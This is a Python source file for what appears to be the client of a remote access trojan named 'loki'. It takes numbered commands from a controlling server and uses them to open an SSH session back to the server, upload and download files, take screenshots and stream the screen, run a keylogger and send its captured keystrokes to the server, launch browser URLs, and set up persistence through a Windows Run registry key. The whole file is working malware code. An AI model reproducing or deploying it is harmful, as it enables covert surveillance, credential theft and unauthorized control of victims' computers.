# Date: 06/04/2018
# Author: Pure-L0G1C
# Description: Communicate with server

import sys
import subprocess
from os import chdir
from time import sleep
from queue import Queue
from threading import Thread, RLock
from . import ssh, sftp, screen, sscreenshare, keylogger


class Shell(object):

    def __init__(self, sess_obj, services, home):
        self.recv_queue = Queue()
        self.disconnected = False
        self.services = services
        self.session = sess_obj
        self.home = home

        self.is_alive = True
        self.lock = RLock()

        self.ftp = None
        self.ssh = None
        self.keylogger = None
        self.screenshare = None

        self.cmds = {
            1: self.ssh_obj,
            2: self.reconnect,
            3: self.download,
            4: self.upload,
            5: self.screen,
            6: self.chrome,
            7: self.disconnect,
            8: self.create_persist,
            9: self.remove_persist,
            12: self.logger_start,
            13: self.logger_stop,
            14: self.logger_dump,
            15: self.screenshare_start,
            16: self.screenshare_stop
        }

    def listen_recv(self):
        while self.is_alive:
            recv = self.session.recv()
            if recv == -1:
                continue  # timed out

            if recv:
                with self.lock:
                    self.recv_queue.put(recv)
            else:
                if self.is_alive:
                    self.is_alive = False
                    self.display_text('Server went offline')

    def parser(self):
        while self.is_alive:
            if self.recv_queue.qsize():
                data = self.recv_queue.get()
                code = data['code']
                args = data['args']
                self.display_text(data['args'])
                if code in self.cmds:
                    Thread(target=self.cmds[code], args=[
                           args], daemon=True).start()

    def stop(self):
        if self.ssh:
            self.ssh.close()

        if self.ftp:
            self.ftp.close()

        if self.keylogger:
            self.keylogger.stop()

        if self.screenshare:
            self.screenshare.stop()

    def shell(self):
        t1 = Thread(target=self.listen_recv)
        t2 = Thread(target=self.parser)

        t1.daemon = True
        t2.daemon = True

        t1.start()
        t2.start()

        while self.is_alive:
            try:
                sleep(0.5)
            except:
                break
        self.close()

    def send(self, code=None, args=None):
        self.session.send(code=code, args=args)

    # -------- UI -------- #

    def display_text(self, text):
        print('{0}Response: {1}{0}'.format('\n\n\t', text))

    def close(self):
        self.is_alive = False
        self.session.shutdown()
        self.stop()

    def reconnect(self, args):
        print('Reconnecting ...')
        self.close()

    def disconnect(self, args):
        print('Disconnecting ...')
        self.disconnected = True
        self.close()

    def ssh_obj(self, args):
        if self.ssh:
            self.ssh.close()

        self.ssh = ssh.SSH(
            self.services['ssh']['ip'], self.services['ssh']['port'], self.home)
        t = Thread(target=self.ssh.client)
        t.daemon = True
        t.start()

    def screenshare_start(self, update):
        if self.screenshare:
            self.screenshare.stop()

        self.screenshare = sscreenshare.ScreenShare(
            self.services['ftp']['ip'], self.services['ftp']['port'], update
        )

        if self.screenshare.setup() != 0:
            self.screenshare = None
        else:
            Thread(target=self.screenshare.start, daemon=True).start()

    def screenshare_stop(self, args):
        if self.screenshare:
            self.screenshare.stop()

    def download(self, args):
        print('Downloading ...')
        self.ftp = sftp.sFTP(
            self.services['ftp']['ip'], self.services['ftp']['port'], self.home, verbose=True)
        try:
            self.ftp.recv()
        except:
            pass
        finally:
            self.ftp.close()

    def upload(self, file):
        print('Uploading {}'.format(file))
        self.ftp = sftp.sFTP(
            self.services['ftp']['ip'], self.services['ftp']['port'], self.home, verbose=True)
        try:
            self.ftp.send(file)
        except:
            pass
        finally:
            self.ftp.close()

    def screen(self, args):
        chdir(self.home)
        screen.screenshot()
        self.upload(screen.file)
        screen.clean_up()

    def chrome(self, urls):
        if '-1' in urls:
            return
        cmd = 'start chrome -incognito {}'.format(' '.join(urls))
        subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def create_persist(self, args):
        if hasattr(sys, 'frozen'):
            _path = sys.executable
            cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "\"{}\""'.format(
                _path)
            subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def remove_persist(self, args):
        if hasattr(sys, 'frozen'):
            cmd = r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f'
            subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def logger_start(self, args):
        if not self.keylogger:
            self.keylogger = keylogger.Keylogger()
        self.keylogger.start()

    def logger_stop(self, args):
        if self.keylogger:
            self.keylogger.stop()

    def logger_dump(self, args):
        if self.keylogger:
            self.send(-0, self.keylogger.dump())
